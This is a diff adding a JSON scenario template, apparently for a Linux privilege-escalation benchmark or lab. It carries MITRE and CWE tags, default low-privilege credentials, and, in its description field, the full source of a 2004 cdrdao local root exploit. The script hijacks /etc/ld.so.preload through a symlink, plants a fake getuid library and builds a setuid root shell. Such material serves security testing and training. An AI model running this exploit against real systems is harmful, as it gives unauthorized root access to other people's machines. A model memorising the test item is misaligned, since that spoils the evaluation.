@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_434",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: CDRDAO - Local Privilege Escalation (OSVDB-16491)\n\nExploit source code (434.sh):\n```\n#!/bin/sh\nDIR=`pwd`\necho \"\"\necho \"cdrdao local root exploit - gr doesn't protect you this time\"\necho \"Karol Wiêsek <appelast*drumnbass.art.pl>\"\necho \"\"\nsleep 2\numask 000\necho -n \"[*] Checking if /etc/ld.so.preload doesn't exist ... \"\nif [ -f /etc/ld.so.preload ]; then\necho \"WRONG\"\necho \"/etc/ld.so.preload exists, write another exploit ;P\"\nexit\nelse\necho \"OK\"\nfi\necho -n \"[*] Checking if su is setuid ... \"\nif [ -u /bin/su ];then\necho \"OK\"\nelse\necho \"WRONG\"\nexit\nfi\necho -n \"[*] Creating evil *uid() library ... \"\ncat > getuid_lib.c << _EOF\nint getuid(void) {\nreturn 0; }\n_EOF\ngcc -o getuid_lib.o -c getuid_lib.c\nld -shared -o getuid_lib.so getuid_lib.o\nrm -f getuid_lib.c getuid_lib.o\nif [ -f ./getuid_lib.so ]; then\necho \"OK\"\nelse\necho \"WRONG\"\nfi\necho -n \"[*] Creating suidshell ... \"\ncat > suid.c << _EOF\nint main(void) {\nsetgid(0); setuid(0);\nunlink(\"./suid\");\nexecl(\"/bin/sh\",\"sh\",0); }\n_EOF\ngcc -o suid suid.c\nrm -f suid.c\nif [ -x ./suid ];then\necho \"OK\"\nelse\necho \"WRONG\"\nexit\nfi\necho -n \"[*] Exploiting cdrdao ... \"\nln -sf /etc/ld.so.preload $HOME/.cdrdao\nif [ ! -L $HOME/.cdrdao ];then\necho \"Could'n link to \\$HOME/.cdrdao\"\nexit\nfi\ncdrdao unlock --save 2>/dev/null\n>/etc/ld.so.preload\necho \"$DIR/getuid_lib.so\" > /etc/ld.so.preload\nsu - -c \"rm /etc/ld.so.preload; chown root:root $DIR/suid; chmod +s $DIR/suid\"\nif [ -s ./suid ];then\necho \"OK\"\nelse\necho \"WRONG\"\nexit\nfi\nrm -f getuid_lib.so\nunlink $HOME/.cdrdao\necho \"Entering rootshell ... ;]\"\n./suid\n\n# milw0rm.com [2004-09-07]\n```",
+  "cve": "OSVDB-16491",
+  "exploitdb_id": "434",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_434",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
